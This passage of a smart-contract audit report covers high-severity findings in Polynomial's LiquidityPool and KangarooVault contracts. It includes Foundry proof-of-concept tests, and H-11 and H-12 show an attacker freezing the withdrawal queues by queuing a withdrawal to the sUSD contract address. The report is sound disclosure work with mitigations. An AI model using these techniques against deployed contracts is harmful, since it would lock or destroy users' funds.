        assertEq(susd.balanceOf(address(kangaroo)), 168969);
    }

### Recommended Mitigation Steps

Fix `getTokenPrice()` to handle the scenario when `totalSupply()` is zero.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/160#issuecomment-1480982595):**
 > Feels extremely similar to https://github.com/code-423n4/2023-03-polynomial-findings/issues/157 by the same warden, but the impact is on a different contract and requires a different POC.<br>
> Won't flag as a duplicate for now.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/160#issuecomment-1510106874)**

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/160#issuecomment-1532114379):**
 > Will keep as high due to the warden showing in this case a direct impact on assets.



***

## [[H-07] Missing totalFunds update in LiquidityPool's `OpenShort()`, causing LiquidityPool token holder to lose a portion of their token value](https://github.com/code-423n4/2023-03-polynomial-findings/issues/153)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-03-polynomial-findings/issues/153), also found by [auditor0517](https://github.com/code-423n4/2023-03-polynomial-findings/issues/231), [0xbepresent](https://github.com/code-423n4/2023-03-polynomial-findings/issues/62), [kaden](https://github.com/code-423n4/2023-03-polynomial-findings/issues/46), and [0xRobocop](https://github.com/code-423n4/2023-03-polynomial-findings/issues/20)*

The function `openShort()` in `LiquidityPool.sol` is missing an update to `totalFunds`, to increase `LiquidityPool` funds by the collected net fees.

### Impact

As a result of the missing increment to `totalFunds`, the `availableFunds` in the `LiquidityPool` will be lower. This will impact the token price, causing a lower token price on `openShort()` trades. This will result in `LiquidityPool` token holders to lose part of their token value.

**Detailed Explanation**

The function `openShort()` is supposed to increase the `totalFunds` by `(feesCollected - externalFee)` as the trading fees is paid by the trader, via a deduction of the `tradeCost`.

        totalCost = tradeCost - fees;

        SUSD.safeTransfer(user, totalCost);


### Proof of Concept

Add the following imports and test case to `test/LiquidityPool.Trades.t.sol`

    import {wadMul} from "solmate/utils/SignedWadMath.sol";
    import {IPerpsV2Market} from "../src/interfaces/synthetix/IPerpsV2Market.sol";


    function testLiquidityPoolOpenShort() public {
        uint256 amount = 1e18;

        (uint256 markPrice, bool isInvalid) = pool.getMarkPrice();
        uint256 tradeCost = amount.mulWadDown(markPrice);
        uint256 fees = pool.orderFee(int256(amount)); 
        uint256 delta = pool.getDelta();
        int256 hedgingSize = wadMul(int256(amount), int256(delta));
        IPerpsV2Market perp = pool.perpMarket();
        (uint256 hedgingFees, ) = perp.orderFee(hedgingSize, IPerpsV2MarketBaseTypes.OrderType.Delayed);
        uint256 feesCollected = fees - hedgingFees;
        uint256 externalFee = feesCollected.mulWadDown(pool.devFee());

        uint256 totalFundsBefore = pool.totalFunds();
        int256 usedFundsBefore = pool.usedFunds();

        // Open a Short trade
        openShort(amount, amount * 1000, user_1);

        // Calculated expected totalFunds and usedFunds
        uint256 expectedTotalFunds = totalFundsBefore + feesCollected - externalFee;
        uint256 marginRequired = tradeCost + hedgingFees;
        int256 expectedUsedFunds = usedFundsBefore + int256(tradeCost) - int256(hedgingFees) + int256(marginRequired);

        // This is incorrect as LiquidityPool's totalFunds is supposed to increase by net fee (feesCollected - externalFee)
        assertLt(pool.totalFunds(), expectedTotalFunds);

        // LiquidityPool's UsedFunds is also wrong and is higher than expected as it included hedgingFees.
        assertGt(pool.usedFunds(), expectedUsedFunds);

        uint256 poolAvailableFunds = pool.totalFunds() - uint256(pool.usedFunds());
        uint256 expectedAvailableFunds = expectedTotalFunds - uint256(expectedUsedFunds);
      
        // LiquidityPool's available funds is wrong and is less than expected, as totalFunds is not increased correctly
        assertLt(poolAvailableFunds, expectedAvailableFunds);
        assertEq(poolAvailableFunds, expectedAvailableFunds - hedgingFees);


        // LiquidityPool's available funds is wrong and is also less than SUSD balance 
        assertLt(poolAvailableFunds, susd.balanceOf(address(pool)));

        // LiquidityPool's available fund is expected to be the same as Pool's SUSD balance
        assertEq(expectedAvailableFunds, susd.balanceOf(address(pool)));

        // LiquidityPool Token price is less than expected.
        assertLt(pool.getTokenPrice(), getExpectedTokenPrice(expectedTotalFunds, expectedUsedFunds, perp));

    }

    function getExpectedTokenPrice(uint256 expectedTotalFunds, int256 expectedUsedFunds, IPerpsV2Market perp) public returns (uint256 expectedTokenPrice) {
        (uint256 markPrice,) = pool.getMarkPrice();
        uint256 totalValue = expectedTotalFunds;
        uint256 totalSupply = lqToken.totalSupply() + pool.totalQueuedWithdrawals();
        uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());
        uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());
        //uint256 totalMargin = _getTotalMargin();

        (uint256 totalMargin,) = perp.remainingMargin(address(pool));

        totalValue += totalMargin + amountToCollect;
        totalValue -= uint256((int256(amountOwed) + expectedUsedFunds));

        expectedTokenPrice = totalValue.divWadDown(totalSupply);
    }

### Recommended Mitigation Steps

Add the following to update `totalFunds` with the net fee collection.

        totalFunds += feesCollected - externalFee;

**[rivalq (Polynomial) disputed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/153#issuecomment-1494736619):**
 > Fee part is included in usedFunds, At any time pool's total funds is not just included in `totalFunds`, but some part of it is in `usedFunds`, note that usedFunds can be negative too. 

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/153#issuecomment-1500991349):**
 > As this issue was raised by several wardens, I'm willing to give this the benefit of the doubt and would like to ask the sponsor @rivalq to view it a second time. Perhaps looking through duplicated issues? They are mostly low quality and badly explained but might be on to something. https://github.com/code-423n4/2023-03-polynomial-findings/issues/46 is the duplicate with the most arguments.
> 
> I'd like to use this issue to bring attention to another issue, https://github.com/code-423n4/2023-03-polynomial-findings/issues/117, as it actually says the opposite (that `openShort` is done right but `closeLong` has an extra update that shouldn't exist). So, this one, which I repeat isn't a duplicate but actually an opposite finding, might be right.

**[mubaris (Polynomial) confirmed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/153#issuecomment-1518536308):**
 > I'm confirming this from our side, although I think it's a Medium risk similar to `#117`.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/153#issuecomment-1532263820):**
 > As this is still considered a loss of funds for users, I'll keep it as High.

***

## [[H-08] Incorrect calculation of `usedFunds` in LiquidityPool leads to lower than expected token price](https://github.com/code-423n4/2023-03-polynomial-findings/issues/152)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-03-polynomial-findings/issues/152), also found by [auditor0517](https://github.com/code-423n4/2023-03-polynomial-findings/issues/235) and [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/116)*

In `LiquidityPool.sol`, the functions `openLong()`, `closeLong()`, `openShort()` and `closeShort()` do not deduct `hedgingFees` from `usedFunds` to offset the `hedgingFees` that was added due to `_hedge()`.

### Impact

The missing deduction of `hedgingFees` will increase the `usedFunds` in `LiquidityPool`, thus reducing the `availableFunds`. This leads to a lower token price, causing `LiquidityPool` token holders to be shortchanged, losing a portion of their token value.

### Detailed Explanation

Passive users can provide liquidity to the Liquidity Pool to earn exchange fees, while traders can take long or short position against the Exchange.

The trade functions `openLong()`, `closeLong()`, `openShort()` and `closeShort()` in `LiquidityPool.sol` will call `_hedge` to hedge the liquidity pool's exposure during a trade.

The `hedge()` will actually increase `usedFunds` by the margin required, which includes `hedgingFees` as these are transfered over to the `perpMarket` for the hedging.

        uint256 marginRequired = _calculateMargin(hedgingSize) + hedgingFees;
        usedFunds += int256(marginRequired);
        require(usedFunds <= 0 || totalFunds >= uint256(usedFunds));

        perpMarket.transferMargin(int256(marginRequired));  

Using the `OpenLong()` trade as an example, the trader transfers the `tradeCost + fees` to `LiquidityPool`, which includes the premium, `hedgingFees`,  `feesCollected` and `externalFee`.  That means the `hedgingFees` that was transfered in `_hedge()` is actually provided by the trader and not the `LiquidityPool`.

Hence, the `usedFunds` should be reduced by `hedgingFees` to offset the addition in `_hedge()`.

```
    uint256 fees = orderFee(int256(amount));
    totalCost = tradeCost + fees;

    SUSD.safeTransferFrom(user, address(this), totalCost);

    uint256 hedgingFees = _hedge(int256(amount), false);
    uint256 feesCollected = fees - hedgingFees;
    uint256 externalFee = feesCollected.mulWadDown(devFee);

    SUSD.safeTransfer(feeReceipient, externalFee);

    usedFunds -= int256(tradeCost);
    totalFunds += feesCollected - externalFee;
    
```

### Proof of Concept

Then add the following imports and test case to `test/LiquidityPool.Trades.t.sol`

    import {wadMul} from "solmate/utils/SignedWadMath.sol";
    import {IPerpsV2Market} from "../src/interfaces/synthetix/IPerpsV2Market.sol";


    function testLiquidityPoolFundCalculation() public {
        uint256 longAmount = 1e18;

        (uint256 markPrice, bool isInvalid) = pool.getMarkPrice();
        uint256 tradeCost = longAmount.mulWadDown(markPrice);
        uint256 fees = pool.orderFee(int256(longAmount)); 
        uint256 delta = pool.getDelta();
        int256 hedgingSize = wadMul(int256(longAmount), int256(delta));
        IPerpsV2Market perp = pool.perpMarket();
        (uint256 hedgingFees, ) = perp.orderFee(hedgingSize, IPerpsV2MarketBaseTypes.OrderType.Delayed);
        uint256 feesCollected = fees - hedgingFees;
        uint256 externalFee = feesCollected.mulWadDown(pool.devFee());

        uint256 totalFundsBefore = pool.totalFunds();
        int256 usedFundsBefore = pool.usedFunds();

        // Open a Long trade
        openLong(longAmount, longAmount * 1000, user_1);

        // Calculated expected totalFunds and usedFunds
        uint256 expectedTotalFunds = totalFundsBefore + feesCollected - externalFee;
        uint256 marginRequired = tradeCost + hedgingFees;
        int256 expectedUsedFunds = usedFundsBefore - int256(tradeCost) - int256(hedgingFees) + int256(marginRequired);

        // This is correct as the pool will increase by net fee (feesCollected - externalFee)
        assertEq(pool.totalFunds(), expectedTotalFunds);

        // LiquidityPool's UsedFunds is wrong and is higher than expected as it included hedgingFees.
        assertGt(pool.usedFunds(), expectedUsedFunds);

        uint256 poolAvailableFunds = pool.totalFunds() - uint256(pool.usedFunds());
        uint256 expectedAvailableFunds = expectedTotalFunds - uint256(expectedUsedFunds);
        
        // LiquidityPool's available funds is wrong and is less than expected as it factored in hedgingFees
        assertLt(poolAvailableFunds, expectedAvailableFunds);
        assertEq(poolAvailableFunds, expectedAvailableFunds - hedgingFees);

        // LiquidityPool's available funds is wrong and is also less than SUSD balance 
        assertLt(poolAvailableFunds, susd.balanceOf(address(pool)));

        // LiquidityPool's available fund is expected to be the same as Pool's SUSD balance
        assertEq(expectedAvailableFunds, susd.balanceOf(address(pool)));

        // LiquidityPool Token price is less than expected.
        assertLt(pool.getTokenPrice(), getExpectedTokenPrice(expectedTotalFunds, expectedUsedFunds, perp));
        
    }

    function getExpectedTokenPrice(uint256 expectedTotalFunds, int256 expectedUsedFunds, IPerpsV2Market perp) public returns (uint256 expectedTokenPrice) {
        (uint256 markPrice,) = pool.getMarkPrice();
        uint256 totalValue = expectedTotalFunds;
        uint256 totalSupply = lqToken.totalSupply() + pool.totalQueuedWithdrawals();
        uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());
        uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());
        //uint256 totalMargin = _getTotalMargin();

        (uint256 totalMargin,) = perp.remainingMargin(address(pool));

        totalValue += totalMargin + amountToCollect;
        totalValue -= uint256((int256(amountOwed) + expectedUsedFunds));

        expectedTokenPrice = totalValue.divWadDown(totalSupply);
    }

### Recommended Mitigation Steps

Deduct `hedgingFees` from `usedFunds` to offset the `hedgingFees` added in `_hedge()`.

For example, in openLong change

        usedFunds -= int256(tradeCost); 

to

         usedFunds -= int256(tradeCost) - int256(hedgingFees);

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/152#issuecomment-1494392554)**



***

## [[H-09] Excessive trading fees can result in 99.9% collateral loss for the trader](https://github.com/code-423n4/2023-03-polynomial-findings/issues/129)
*Submitted by [bytes032](https://github.com/code-423n4/2023-03-polynomial-findings/issues/129)*

This issue can lead to traders losing all their collateral due to excessive fees when opening and closing larger trades.

### Proof of Concept

When the exchange opens/closes trades, it defines the order fees to be paid by the user using the `orderFee` function. The function takes into account both the hedging fee, which covers the cost of managing the risk associated with holding the position, and the trading fee, which accounts for the costs incurred when executing the trade.

The function works as follows:

1.  It first calculates the `delta`, a factor representing the rate at which the position size changes.
2.  Then, it computes the `futuresSizeDelta` by multiplying the input `sizeDelta` with the calculated `delta`.
3.  It calls the `perpMarket.orderFee` function to get the `hedgingFee` and a boolean flag, `isInvalid`, which indicates if the trade is invalid.
4.  It checks if the trade is valid by ensuring `isInvalid` is not set to `true`. If the trade is invalid, it will throw an exception.
5.  It retrieves the `markPrice` from the `exchange.getMarkPrice` function, which represents the current market price of the asset.
6.  The function calculates the `valueExchanged` by multiplying the `markPrice` with the absolute value of `sizeDelta`. This represents the total value of the trade.
7.  It computes the `tradeFee` using the `getSlippageFee` function, which calculates the fee based on the size of the trade.
8.  The `tradingFee` is calculated by multiplying the `tradeFee` with `valueExchanged`.
9.  Finally, the function returns the sum of the `hedgingFee` and `tradingFee` as the total fee for the trade.

By combining both the hedging fee and trading fee, the `orderFee` function comprehensively calculates the costs associated for the trade.

The problem here lies in the `getSlippageFee` (`LiquidityPool.sol#L367-L374`) function.  The purpose of the `getSlippageFee` function is to calculate the slippage fee for a trade based on the change in position size, represented by the input `sizeDelta`. The slippage fee is a cost associated with executing a trade that accounts for the potential price impact and liquidity changes due to the size of the order. It helps ensure that the trading platform can effectively manage the impact of large trades on the market.

```solidity

    function getSlippageFee(int256 sizeDelta) public view returns (uint256) {
        // ceil(s/100) * baseFee

        uint256 size = sizeDelta.abs();
        uint256 region = size / standardSize;

        if (size % standardSize != 0) region += 1;
        return region * baseTradingFee;
    }
```

The function works as follows:

1.  It first calculates the absolute value of `sizeDelta` to ensure the size is a positive value, regardless of whether the trade is a buy or sell.
2.  It then divides the `size` by `standardSize` (set by default to (`LiquidityPool.sol#L142`) 1e20), to determine the number of regions the trade occupies. This constant value represents the size of a "standard" trade, which is used to categorize trades into different regions based on their size.
3.  If there is a remainder after dividing `size` by the constant value, it increments the `region` by 1. This ensures that even partial regions are taken into account when calculating the fee.
4.  Finally, the function calculates the slippage fee by multiplying the `region` with `baseTradingFee` (currently set (`TestSystem.sol#L202`) to 6e15 in the test suite). This constant value represents the base fee for each region.

By calculating the slippage fee based on the size of the trade, the `getSlippageFee` function helps account for the potential impact of the trade on the market. The larger the trade, the more regions it occupies, resulting in a higher slippage fee. This approach incentivizes traders to be mindful of the size of their trades and the potential impact they may have on market liquidity and pricing.

The issue is that region can get really big (depending on the trade) so that the openTrade/closeTrades `orderFee` could >= 100% meaning all the collateral of the user will be used to pay taxes.

While I completely understand the intent of higher taxes for bigger trades, I think there should be a limit where the trade won't get opened if a certain threshold is passed.

I've built a PoC with Foundry using the protocol test suite with a few comments here and there to represent the following cases:

```solidity
    function depositToPool(address user, uint256 sum) internal {
        susd.mint(user, sum);
        vm.startPrank(user);
        susd.approve(address(pool), sum);
        pool.deposit(sum, user);
        vm.stopPrank();
    }

    function openShort(uint256 amount, uint256 collateral, address user)
        internal
        returns (uint256 positionId, Exchange.TradeParams memory tradeParams)
    {
        tradeParams.amount = amount;
        tradeParams.collateral = address(susd);
        tradeParams.collateralAmount = collateral;
        tradeParams.minCost = 0;

        vm.startPrank(user);
        susd.approve(address(exchange), collateral);
        (positionId,) = exchange.openTrade(tradeParams);
        vm.stopPrank();
    }

     function testSimpleShortCloseTrade() public {
        depositToPool(user_2, 1000e18 * 25000);
        uint256 pricingConstant = exchange.PRICING_CONSTANT();
        uint256 expectedPrice = initialPrice.mulDivDown(initialPrice, pricingConstant);
        uint256 multiplier = 165;
        uint256 collateralAmount = (expectedPrice * 2) * multiplier; // 200% Collateral ratio
        uint256 shortAmount = multiplier * 1e18;
        susd.mint(user_1, collateralAmount);
        console.log("CollateralAmount", collateralAmount / 1e18);
        console.log("ShortAmount", shortAmount / 1e18);
        console.log("User_1 sUSD balance", susd.balanceOf(user_1) / 1e18);


        console.log("*** OPEN TAX ***");
        (uint256 positionId,) = openShort(shortAmount, collateralAmount, user_1);
        console.log("*** OPEN TAX ***\n");

        console.log("*** CLOSE TAX ***");
        closeShort(positionId, shortAmount, type(uint256).max, collateralAmount, user_1);
        console.log("*** CLOSE TAX ***");

        console.log("User_1 sUSD balance", susd.balanceOf(user_1) / 1e18);
    }
```

I'm going to use the formula `(orderFee * 2) / collateralAmount` to calculate the tax percentage. For each case, I'll just modify the `multiplier` variable.

Case 1: (multiplier 165)<br>
CollateralAmount 237600<br>
ShortAmount 165<br>
The tax % is: 1,7996633

Running the tests, yields the following results.

![](https://i.imgur.com/Okrd9EI.png)

Case 2: (multiplier 1650)<br>
CollateralAmount 2376000<br>
ShortAmount 1650<br>
The tax % is: 10,8

Running the tests yields the following results.

![](https://i.imgur.com/PYcc26N.png)

Case 3: (multiplier 16500)<br>
CollateralAmount 23760000<br>
ShortAmount 16500<br>
The tax % is: 99,6

![](https://i.imgur.com/OxLYyTp.png)

Case 3 proves the point that a user can potentially lose all his collateral just by paying taxes when opening/closing a trade.

### Tools Used

Manual review, Foundry

### Recommended Mitigation Steps

This invariant is heavily influenced by the calculation in `LiquidityPool.sol#L371`. In case 1 the region is 1, in case 2 is 16 and in case 3 is 165.

To address this issue, a protocol-wide maximum amount of taxes to be paid in a trade (total of open + close) should be established. If the calculated fee exceeds this threshold, the transaction should be reverted instead of opening the trade for the user. This will help protect traders from losing all their collateral due to excessive trading fees.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/129#issuecomment-1496973520)**

***

## [[H-10] Function `hedgePositions` is incorrect, because it missed the `queuedPerpSize` in the calculation](https://github.com/code-423n4/2023-03-polynomial-findings/issues/113)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/113)*

Function `hedgePositions` is incorrect, leads to the hedging will not work as expected, and `LiquidityPool` can lose funds without expectation.

### Proof of concept

Let's see function `hedgePositions` in `LiquidtyPool` contract:

```solidity
function hedgePositions() external override requiresAuth nonReentrant {
    int256 currentPosition = _getTotalPerpPosition();
    int256 skew = _getSkew();
    uint256 delta = _getDelta();
    int256 requiredPosition = wadMul(skew, int256(delta));

    int256 newPosition = requiredPosition - currentPosition;
    int256 marginDelta = int256(_calculateMargin(newPosition));

    if (requiredPosition.abs() < currentPosition.abs()) {
        marginDelta = -marginDelta;
    }

    usedFunds += marginDelta;

    perpMarket.transferMargin(marginDelta);
    _placeDelayedOrder(newPosition, false);

    emit HedgePositions(currentPosition, requiredPosition, marginDelta);
}
```

`currentPosition` is the sum of: the current position size of `LiquidityPool` in Synthetix and the delta size of the current delayed order which was submitted into Synthetix perp market.

```solidity
///url = https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L738-L743
function _getTotalPerpPosition() internal view returns (int256 positionSize) {
    IPerpsV2MarketBaseTypes.Position memory position = perpMarket.positions(address(this));
    IPerpsV2MarketBaseTypes.DelayedOrder memory delayedOrder = perpMarket.delayedOrders(address(this));

    positionSize = position.size + delayedOrder.sizeDelta;
}
```

However, `currentPosition` missed the variable `queuedPerpSize`, is the total amount of pending size delta (waiting to be submitted).

Then `_placeDelayedOrder` will be called with the wrong `newPosition`, leads to the position size of pool can get a large deviation. The hedging will not be safe anymore.

**Scenario:**

*   `_getTotalPerpPosition` = 0,
    `requiredPosition` = 1000,
    `queuedPerpSize` = 1000
*   `newPosition` is calculated incorrectly to be 1000 (since it missed `queuedPerpSize`)
*   It calls `_placeDelayedOrder(1000, false)`, then `queuedPerpSize` increase to be 2000
*   After executing all delayed orders, position size of LiquidityPool = 2000 (incorrect hedging)
*   `newPosition` should be -1000 in this case

### Recommended Mitigation Steps

`currentPosition` should be `_getTotalPerpPosition()` + `queuedPerpSize` in function `hedgePositions`.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/113#issuecomment-1495945342)**

***

## [[H-11] KangarooVault `QueuedWithdraw` Denial of Service](https://github.com/code-423n4/2023-03-polynomial-findings/issues/105)
*Submitted by [Lirios](https://github.com/code-423n4/2023-03-polynomial-findings/issues/105)*

When the `KangarooVault` has an open position, any withdrawals that are initiated, are queued.

`QueuedWithdrawals` work in two steps.

1.  A user initialtes the Withdrawal via `initiateWithdrawal` (`KangarooVault.sol#L215`). This burns the `VaultToken` and `if (positionData.positionId != 0)` (`KangarooVault.sol#L225`) adds the request to the `withdrawalQueue`.
2.  `processWithdrawalQueue()` can be called to process requests in the `withdrawalQueue` that have passed `minWithdrawDelay` to transfer the SUSD tokens to the user.

If the processing of a `QueuedWithdraw` entry in the `withdrawalQueue` reverts, the `queuedWithdrawalHead` (`KangarooVault.sol#L331`) will never increase and further processing of the queue will be impossible.
This means that any users that have placed a QueuedWithdraw after the reverting entry will have lost their vaultToken without receiving their SUSD.

### Proof of Concept

When calling the `initiateWithdrawal()` function, the user can provide an address of the receiver of funds.

When processing the withdrawal queue, the contracts does all the required checks, and then transfers the SUSD (`KangarooVault.sol#L322`) to the provided user.

If we look at the [Synthetix sUSD token](https://optimistic.etherscan.io/address/0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9) and it's [target implementation](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code) we will find that the SUSD token transfer code is:

[sUSD MultiCollateralSynth:L723-L739](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code)

```solidity

function _internalTransfer(
    address from,
    address to,
    uint value
) internal returns (bool) {
    /* Disallow transfers to irretrievable-addresses. */
    require(to != address(0) && to != address(this) && to != address(proxy), "Cannot transfer to this address");

    // Insufficient balance will be handled by the safe subtraction.
    tokenState.setBalanceOf(from, tokenState.balanceOf(from).sub(value));
    tokenState.setBalanceOf(to, tokenState.balanceOf(to).add(value));

    // Emit a standard ERC20 transfer event
    emitTransfer(from, to, value);

    return true;
}
```

This means any SUSD transfer to the SUSD proxy or implementation contract, will result in a revert.

An attacker can use this to make a `initiateWithdrawal()` request with `user=sUSDproxy` or `user=sUSD_MultiCollateralSynth`. Any user that request a Withdrawal via `initiateWithdrawal()` after this, will lose their vault tokens without receiving their SUSD.

The attacker can do this at any time, or by frontrunning a specific (large) `initiateWithdrawal()` request.

To test it, a check is added to the mock contract that is used for SUSD in the test scripts:

```diff
diff --git a/src/test-helpers/MockERC20Fail.sol b/src/test-helpers/MockERC20Fail.sol
index e987f04..1ce10ec 100644
--- a/src/test-helpers/MockERC20Fail.sol
+++ b/src/test-helpers/MockERC20Fail.sol
@@ -18,6 +18,9 @@ contract MockERC20Fail is MockERC20 {
     }

     function transfer(address receiver, uint256 amount) public override returns (bool) {
+
+        require(receiver != address(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB) , "Cannot transfer to this address");
+
         if (forceFail) {
             return false;
         }
```

In the `KangarooVault.t.sol` test script, the following test was added to demonstrated the issue:

```solidity
// add to top of file:
import {IVaultToken} from "../../src/interfaces/IVaultToken.sol";


// add to KangarooTest Contract:
    function testWithdrawalDOS() public {

        IVaultToken vault_token = kangaroo.VAULT_TOKEN();
        // make deposit for user_2
        susd.mint(user_2, 2e23);
        vm.startPrank(user_2);
        susd.approve(address(kangaroo), 2e23);
        kangaroo.initiateDeposit(user_2, 2e23);
        assertEq(vault_token.balanceOf(user_2),2e23);
        vm.stopPrank();


        // have vault open a position to force queued wthdrawals
        testOpen();

        // vault has  position opened, withdrawal will be queued, vault_token burned, no USDC received
        vm.startPrank(user_2);
        kangaroo.initiateWithdrawal(user_2, 1e23);
        assertEq(susd.balanceOf(user_2),0);
        assertEq(vault_token.balanceOf(user_2),1e23);
        
        // process withdrawalqueue, withdrawam should pass
        skip(kangaroo.minWithdrawDelay());         
        kangaroo.processWithdrawalQueue(3);
        uint256 user_2_balance = susd.balanceOf(user_2);
        assertGt(user_2_balance,0);        
        vm.stopPrank();


        // user 3 frontruns with fake/reverting withdrawal request.
        // to 0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB (= SUSD MultiCollateralSynth contract address). 
        // This will cause SUSD transfer to revert.
        vm.startPrank(user_3);        
        kangaroo.initiateWithdrawal(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB, 0);
        vm.stopPrank();

        // user_2 adds another withdrawal request, after the attackers request, vault_token burned, no USDC received
        vm.startPrank(user_2);  
        kangaroo.initiateWithdrawal(user_2, 1e23);
        assertEq(vault_token.balanceOf(user_2),0);


        // processWithdrawalQueue now reverts and no funds received
        skip(kangaroo.minWithdrawDelay());
        vm.expectRevert(bytes("TRANSFER_FAILED"));
        kangaroo.processWithdrawalQueue(3);
        assertEq(susd.balanceOf(user_2),user_2_balance);
        assertEq(vault_token.balanceOf(user_2),0);
        vm.stopPrank();

    }

```

### Tools Used

Manual review, forge

### Recommended Mitigation Steps

The processing of `withdrawalQueue` should have a mechanism to handle reverting `QueuedWithdraw` entries.
Either by skipping them and/or moving them to another `failedWithdrawals` queue.

**[Dravee (judge) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/105#issuecomment-1480041654):**
 > Similar but different from https://github.com/code-423n4/2023-03-polynomial-findings/issues/103
> 
> Somehow the import should be `import {IVaultToken} from "../src/interfaces/IVaultToken.sol";` (one step less), but the POC runs correctly after that.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/105#issuecomment-1497289993)**



***

## [[H-12] Denial of service of Liquiditypool `QueuedWithdrawals`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/103)
*Submitted by [Lirios](https://github.com/code-423n4/2023-03-polynomial-findings/issues/103), also found by [bin2chen](https://github.com/code-423n4/2023-03-polynomial-findings/issues/132)*

The preferred way for withdrawals of the Liquiditypool is to do this via a withdrawal queue.
According to Polynomial:

> Queuing will be the default deposit/withdraw mechanism (In the UI) and not planning to charge any fees for this mechanism\
> Instant deposit / withdraw is mechanism is meant for external integrations in case if they don't want to track status of the queued deposit or withdraw

It is also stimulated to use `queueWithdraw()` over `withdraw()` by charging a withdrawalFee for direct withdrawals.

QueuedWithdrawals work in two steps.

1.  A user initialtes the Withdrawal via `queueWithdraw()`. This burns the `liquidityTokens` and adds the request to the `withdrawalQueue`.
2.  `processWithdraws()` can be called to process requests in the `withdrawalQueue` that have passed `minWithdrawDelay` to transfer the SUSD tokens to the user.

If the processing of a `QueuedWithdraw` in the `withdrawalQueue` reverts, the `queuedWithdrawalHead` (`LiquidityPool.sol#LL331C13-L331C33`) will never increase and further processing of the queue will be impossible.
This means that any users that have placed a QueuedWithdraw after the reverting entry will have lost their liquiditytokens without receiving their SUSD.

### Proof of Concept

When calling the `queueWithdraw()` function, the user can provide an address of the receiver of funds.

When processing the withdrawal queue, the contracts does all the required checks, and then transfers the SUSD (`LiquidityPool.sol#L311`) to the provided user.

If we look at the [Synthetix sUSD token](https://optimistic.etherscan.io/address/0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9) and it's [target implementation](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code) we will find that the SUSD token transfer code is:

[sUSD MultiCollateralSynth:L723-L739](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code)

```solidity

    function _internalTransfer(
        address from,
        address to,
        uint value
    ) internal returns (bool) {
        /* Disallow transfers to irretrievable-addresses. */
        require(to != address(0) && to != address(this) && to != address(proxy), "Cannot transfer to this address");

        // Insufficient balance will be handled by the safe subtraction.
        tokenState.setBalanceOf(from, tokenState.balanceOf(from).sub(value));
        tokenState.setBalanceOf(to, tokenState.balanceOf(to).add(value));

        // Emit a standard ERC20 transfer event
        emitTransfer(from, to, value);

        return true;
    }
```

This means any transfer to the SUSD proxy or implementation contract, will result in a revert.

An attacker can use this to make `queueWithdraw()` request with `user=sUSDproxy` or `user=sUSD_MultiCollateralSynth`.   Any user that request a Withdrawal via `queueWithdraw()` after this, will lose their liquidity tokens without receiving their SUSD.

The attacker can do this at any time, or by frontrunning a specific (large) `queueWithdraw()` request.

To test it, a check is added to the mock contract that is used for SUSD in the test scripts to simulate the SUSD contract behaviour:

```diff
diff --git a/src/test-helpers/MockERC20Fail.sol b/src/test-helpers/MockERC20Fail.sol
index e987f04..1ce10ec 100644
--- a/src/test-helpers/MockERC20Fail.sol
+++ b/src/test-helpers/MockERC20Fail.sol
@@ -18,6 +18,9 @@ contract MockERC20Fail is MockERC20 {
     }

     function transfer(address receiver, uint256 amount) public override returns (bool) {
+
+        require(receiver != address(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB) , "Cannot transfer to this address");
+
         if (forceFail) {
             return false;
         }
```

In the test/LiquidityPool.Deposits.t.sol test file, the following was added.<br>
This results in a revert of the processWithdraws function and failing the test

```diff
iff --git a/test/LiquidityPool.Deposits.t.sol b/test/LiquidityPool.Deposits.t.sol    
index 0bb6f5f..8d70c60 100644
--- a/test/LiquidityPool.Deposits.t.sol
+++ b/test/LiquidityPool.Deposits.t.sol
@@ -291,6 +291,9 @@ contract LiquidityPoolTest is TestSystem {
         // user_2 i-withdraw 20$
         // user_3 q-withdraw 13$

+        // Frontrun all withdrawal requests, since amount =0, can be called by anyone
+        pool.queueWithdraw(0, 0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB);
+
         vm.prank(user_1);
         pool.queueWithdraw(2e19, user_1);
         vm.prank(user_3);

```

### Tools Used

Manual review, forge

### Recommended Mitigation Steps

The processing of withdrawalQueue should have a mechanism to handle reverting `QueuedWithdraw` entries.
Either by skipping them and/or moving them to another `failedWithdrawals` queue.

